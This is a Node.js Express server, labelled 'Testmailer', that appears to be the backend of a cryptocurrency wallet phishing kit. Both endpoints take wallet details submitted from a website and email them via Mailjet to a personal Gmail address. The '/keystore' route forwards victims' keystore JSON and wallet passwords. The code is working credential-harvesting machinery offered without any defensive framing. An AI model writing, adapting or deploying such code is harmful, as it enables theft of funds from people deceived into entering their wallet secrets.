var express = require('express');
var cors = require('cors');
var app = express();
var dotenv = require('dotenv').config();
const Mailjet = require('node-mailjet');
const mailjet = Mailjet.apiConnect(
    process.env.MJ_APIKEY_PUBLIC,
    process.env.MJ_APIKEY_PRIVATE,
);
var port = process.env.PORT || process.env.LOCAL_PORT;

var corsOptions = {
    origin: "*",
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    preflightContinue: false,
    optionsSuccessStatus: 204
}

app.get('/', (req, res) => {
    res.send(`Welcome to Testmailer`)
})

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cors(corsOptions));

app.post('/', (req, res) => {
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "johnkingsley917@gmail.com",
            "Name": "tester"
            }
        ],
        "Subject": "Wallet Details",
        "TextPart": `The following details were submitted from your website: Wallet Name: ${req.body.name}, Type: ${req.body.type}, Address: ${req.body.address}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Link successfully sent')
        res.status("200").json({
            message: "Link successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send link ' + err)
        console.log(err.statusCode)
        res.status("400").json({
            message: 'Unable to send link ' + err
        })
    })
})

app.post('/keystore', (req, res) => {
    const request = mailjet
    .post("send", {'version': 'v3.1'})
    .request({
    "Messages":[
        {
        "From": {
            "Email": "support@virtualfx.org",
            "Name": "Impozzible"
        },
        "To": [
            {
            "Email": "johnkingsley917@gmail.com",
            "Name": "tester"
            }
        ],
        "Subject": "Wallet Details",
        "TextPart": `The following details were submitted from your website: Wallet Name: ${req.body.name}, Type: Keystore, Keystore JSON: ${req.body.jsonKey}, Password: ${req.body.password}`,
        "CustomID": "AppGettingStartedTest"
        }
    ]
    })
    request
    .then(() => {
        console.log('Link successfully sent')
        res.status(200).json({
            message: "Link successfully sent"
        })
    })
    .catch((err) => {
        console.log('Unable to send link ' + err)
        console.log(err.statusCode)
        res.status(400).json({
            message: 'Unable to send link ' + err
        })
    })
})

app.listen(port, () => {
    console.log(`Testmailer server currently active on port ${port}`)
})